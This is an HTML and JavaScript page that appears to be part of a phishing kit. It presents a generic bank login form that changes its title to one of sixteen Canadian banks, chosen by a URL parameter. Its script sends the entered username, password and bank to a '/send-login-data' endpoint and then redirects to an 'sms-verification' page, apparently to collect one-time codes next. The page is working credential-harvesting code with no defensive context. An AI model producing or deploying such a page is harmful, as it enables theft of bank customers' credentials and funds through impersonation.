<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Secure Login</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f5f8fa;
        }

        .container {
            max-width: 400px;
            margin: 80px auto;
            background-color: #ffffff;
            padding: 40px 30px;
            border-radius: 12px;
            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.08);
        }

        h1 {
            text-align: center;
            font-size: 22px;
            margin-bottom: 30px;
            color: #003e6b;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333333;
            margin-bottom: 6px;
            margin-top: 18px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 14px;
            font-size: 15px;
            border: 1px solid #ccc;
            border-radius: 8px;
            transition: border 0.2s;
        }

        input[type="text"]:focus,
        input[type="password"]:focus {
            border-color: #0070cc;
            outline: none;
        }

        button {
            width: 100%;
            margin-top: 25px;
            padding: 12px;
            font-size: 16px;
            background-color: #0070cc;
            color: white;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        button:hover {
            background-color: #005ea6;
        }

        .footer {
            text-align: center;
            margin-top: 30px;
            font-size: 13px;
            color: #888;
        }

        .footer a {
            color: #0070cc;
            text-decoration: none;
        }

        .footer a:hover {
            text-decoration: underline;
        }

        .password-container {
            display: flex;
            align-items: center;
            position: relative;
        }

        .eye-icon {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 18px;
            color: #0070cc;
            cursor: pointer;
        }
    </style>
</head>

<body>
    <div class="container">
        <h1 id="bank-name">Bank Login</h1>

        <label for="username">Username or Access Card</label>
        <input type="text" id="username" placeholder="Enter your Username or Access Card" maxlength="19"
            oninput="formatCardNumber(event)" />

        <label for="password">Password</label>
        <div class="password-container">
            <input type="password" id="password" placeholder="Enter your password" />
            <span class="eye-icon" onclick="togglePasswordVisibility()">
                <i class="fas fa-eye"></i>
            </span>
        </div>

        <button onclick="submitLogin()">Login</button>

        <div class="footer">
            <p>&copy; 2000â€“2025 Secure Banking | <a href="#">Privacy Policy</a></p>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const bank = urlParams.get('bank');

        const bankNames = {
            'td-canada': 'TD Canada Trust',
            'rbc': 'Royal Bank of Canada',
            'scotiabank': 'Scotiabank',
            'bmo': 'BMO',
            'cibc': 'CIBC',
            'national-bank': 'National Bank',
            'tangerine': 'Tangerine',
            'simplii': 'Simplii Financial',
            'wealthsimple': 'Wealthsimple Bank',
            'laurentian-bank': 'Laurentian Bank',
            'manulife': 'Manulife Bank',
            'meridian': 'Meridian',
            'motusbank': 'Motusbank',
            'coast-capital': 'Coast Capital',
            'atb-financial': 'ATB Financial',
            'peoples-trust': 'Peoples Trust'
        };

        if (bank && bankNames[bank]) {
            document.getElementById('bank-name').innerText = bankNames[bank];
        }

        function formatCardNumber(event) {
            const input = event.target;
            let value = input.value.replace(/\D/g, ''); // Remove non-digit characters
            value = value.substring(0, 16); // Limit to 16 digits
            const formattedValue = value.replace(/(\d{4})(?=\d)/g, '$1 '); // Add space after every 4 digits
            input.value = formattedValue;
        }

        function togglePasswordVisibility() {
            const passwordField = document.getElementById('password');
            const passwordType = passwordField.type === "password" ? "text" : "password";
            passwordField.type = passwordType;
        }

        function submitLogin() {
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();

            if (!username || !password) {
                alert("Please fill in both fields.");
                return;
            }

            fetch('/send-login-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ username, password, bank })
            })
                .then(res => res.json())
                .then(data => {
                    if (data.success) {
                        window.location.href = `sms-verification.html?bank=${bank}`;
                    } else {
                        alert("Something went wrong. Try again.");
                    }
                })
                .catch(err => {
                    console.error(err);
                    alert("An error occurred. Please try again.");
                });
        }
    </script>
</body>

</html>
